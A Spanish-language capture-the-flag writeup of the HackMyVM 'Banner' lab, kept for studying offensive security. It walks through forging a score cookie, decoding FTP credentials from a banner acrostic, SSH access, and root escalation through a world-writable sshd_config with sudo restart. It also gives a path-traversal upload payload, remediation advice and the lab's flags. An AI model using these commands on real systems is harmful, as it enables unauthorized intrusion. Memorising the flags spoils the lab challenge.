[Inicio](../../../README.md) · [Red Team](../../README.md)

**Estado: completada hasta root** · [🌐 Abrir writeup visual](https://w4ltersec.github.io/cybersecurity-labs/red-team/hackmyvm/banner/Banner-Writeup.html)

# Banner — HackMyVM — Writeup completo

> **Sistema:** Linux / Debian · **Target del laboratorio:** `192.168.1.36`
> **Objetivo:** flag de usuario + flag de root
> **Cadena:** `quiz web → FTP (111) → SSH (welcome) → root`

[🔗 Abrir la máquina Banner en HackMyVM](https://hackmyvm.eu/machine/Banner)

## Resumen ejecutivo

| Fase | Técnica | Resultado |
| --- | --- | --- |
| Reconocimiento | Enumeración de FTP, SSH y web en 8080 | App Flask/Werkzeug y servicios expuestos |
| Quiz web | Manipulación de la cookie `user_score` | Credenciales FTP `111:banner` |
| Banner FTP | Acróstico de mensajes que rotan en el tiempo | Credenciales SSH de `welcome` |
| Acceso inicial | Login SSH | Usuario `welcome` y user flag |
| Escalada | `sshd_config` escribible y reinicio de sshd mediante sudo | Acceso como `root` |

**Flags capturadas**

- **User:** `flag{user-509fe78ad30da7792f576cd3a91a57fc}`
- **Root:** `flag{root-fc7fb423367bb7fccb411758f06f857a}`

---

## Cadena de explotación

**Fase 01 · Reconocimiento**

### Barrido de puertos y servicios

Tres servicios expuestos. La web en 8080 es una app **Flask/Werkzeug** (quiz de ciberseguridad) corriendo en modo **debug**.

**nmap**

```bash
nmap -sV -sC -p21,22,8080 -Pn 192.168.1.36
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 8.4p1 Debian
8080/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.9.2)
MAC Address: 08:00:27:BE:24:F8 (Oracle VirtualBox)
```

**Fase 02 · Web · Lógica de negocio**

### Bypass de puntuación por cookie

El servidor confía en la cookie **user_score** del cliente. Se falsea a **990** y, con una respuesta correcta, se alcanzan los 1000 puntos que liberan la flag.

**curl · /api/submit**

```bash
curl -i -X POST .../api/submit -H 'Cookie: user_score=990' \
     -d '{"id":1,"answer":"A"}'
Set-Cookie: user_score=1000; ...
Set-Cookie: flag=111:banner; ...
{ "score": 1000, "total": 1000 }
```

🩻Botín: **111:banner** → credenciales FTP

**Fase 03 · FTP · Esteganografía**

### El acróstico del banner dinámico

El fichero **hint** pregunta *"¿sabes qué es un banner?"*. El banner de vsftpd rota 5 frases cada ~60 s; las **iniciales** de las palabras resaltadas forman un mensaje.

**banner · acróstico temporal**

```text
Wild  Elephants  Love          → W E L
Clever  Owls  Make             → C O M
Elephants  :  Mice             → E : M
Amazing  Zebras  Eat           → A Z E
Snakes  Eat  Crickets          → S E C
──────────────────────────────────────────
= W E L C O M E : M A Z E S E C
```

🧩**WELCOME:MAZESEC** → usuario **welcome** / pass **mazesec** (¡en minúsculas!)

**Fase 04 · SSH · Acceso inicial**

### Shell como welcome → User flag

**ssh welcome@192.168.1.36**

```bash
ssh welcome@192.168.1.36 # mazesec
uid=1000(welcome) gid=1000(welcome)
cat /home/welcome/user.txt
flag{user-509fe78ad30da7792f576cd3a91a57fc}
```

**Fase 05 · Escalada de privilegios**

### sshd_config world-writable + sudo service

`/etc/ssh/sshd_config` tiene permisos **0666** y **welcome** puede reiniciar sshd como root. Se habilita login de root por clave propia.

**privesc · root**

```bash
sudo -l
(root) NOPASSWD: /sbin/service sshd restart
ls -la /etc/ssh/sshd_config
-rw-rw-rw- 1 root root  sshd_config  # 0666!
printf 'PermitRootLogin yes\n...\nAuthorizedKeysFile /tmp/.rootkey\n' \
  | cat - /etc/ssh/sshd_config > /tmp/n && cat /tmp/n > /etc/ssh/sshd_config
sudo -n /sbin/service sshd restart
ssh -i rootkey root@192.168.1.36
uid=0(root) gid=0(root) groups=0(root)
```

🏴root · **flag{root-fc7fb423367bb7fccb411758f06f857a}**

## Vía alternativa · RCE web

El endpoint oculto **/api/upload** guarda el fichero con su nombre crudo (`file.save(f'{BASE_DIR}/uploads/{filename}')`) y el servicio corre **como root**. El path traversal da escritura arbitraria; su filesystem está montado solo-lectura, así que se usó como **oráculo** para mapear el sistema y localizar flags y usuarios antes de tener shell.

**path traversal**

```bash
curl -X POST .../api/upload -F 'file=@x;filename=../../../../tmp/pwned.txt'
{ "filename": "../../../../tmp/pwned.txt", "success": true }
# debug=True → filtra código fuente y /opt/ctf-game/data/users.db en las trazas
```

## Vulnerabilidades

| Severidad | Hallazgo | Impacto |
| --- | --- | --- |
| Alta | **Puntuación confiada en cookie** | Bypass total de la lógica del quiz. |
| Media | **Credenciales embebidas** (web + banner) | Fuga de credenciales FTP y SSH. |
| Crítica | **Path traversal en /api/upload** (como root) | Escritura arbitraria de ficheros. |
| Alta | **Flask como root + debug=True** | Fuga de código fuente; superficie de RCE. |
| Crítica | **sshd_config 0666 + sudo service** | Escalada directa a root. |

## Remediación

#### Estado en servidor

Guardar la puntuación en sesión firmada o BD; nunca confiar en cookies del cliente.

#### Sin credenciales embebidas

No distribuir credenciales por banners, cookies ni respuestas de API.

#### Subida segura

`secure_filename()` y validar la ruta canónica dentro del directorio permitido.

#### Mínimo privilegio

Ejecutar Flask como usuario sin privilegios y con `debug=False` en producción.

#### Permisos de config

`chmod 644` y `chown root:root` sobre `/etc/ssh/sshd_config`.

#### sudo endurecido

Evitar reglas que, junto a config escribible, permitan recargar servicios como root.


---

*Writeup basado en el HTML proporcionado por W4lterSec. Práctica autorizada en un laboratorio local; las flags y credenciales corresponden a la máquina de prácticas.*
